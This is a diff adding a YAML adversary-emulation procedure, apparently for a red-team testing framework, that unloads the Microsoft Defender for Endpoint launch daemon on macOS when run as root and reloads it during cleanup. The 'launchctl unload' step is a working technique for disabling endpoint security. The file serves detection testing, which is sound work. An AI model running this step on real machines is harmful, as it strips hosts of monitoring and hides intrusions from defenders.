@@ -1,0 +1,38 @@
+---
+api_version: 2.0
+uuid: 0f42ff86-a837-4cb8-b274-6a2894dc32f1
+name: Disable MDE
+authors:
+  - cedowens
+description: |
+  This TTP simply unloads the com.microsoft.fresno.plist launch daemon to disable MDE instantly.
+args:
+  - name: sleepval
+mitre:
+  tactics:
+    - TA0005 Defense Evasion
+  techniques:
+    - T1562 Impair Defenses
+  subtechniques:
+    - T1562.001 Disable or Modify Tools
+steps:
+  - name: unloadplist
+    inline: |
+      if [ $(whoami) == "root" ]; then
+        echo -e "Unloading /Library/LaunchDaemons/com.microsoft.fresno.plist..."
+        launchctl unload /Library/LaunchDaemons/com.microsoft.fresno.plist
+        touch canaryfile.txt
+      else
+        echo "This TTP must be run with root to successfully execute."
+      fi
+    cleanup:
+      inline: |
+        if [ -f canaryfile.txt ]; then
+           echo "Sleeping for {{ .Args.sleepval }} seconds and then reloading the com.microsoft.fresno.plist launchd daemon..."
+           sleep {{ .Args.sleepval }}
+           launchctl load /Library/LaunchDaemons/com.microsoft.fresno.plist
+           rm canaryfile.txt
+           echo "Cleanup Finished! MDE restored!"
+        else
+           echo "Exiting, as this TTP was not run with sudo rights..."
+        fi
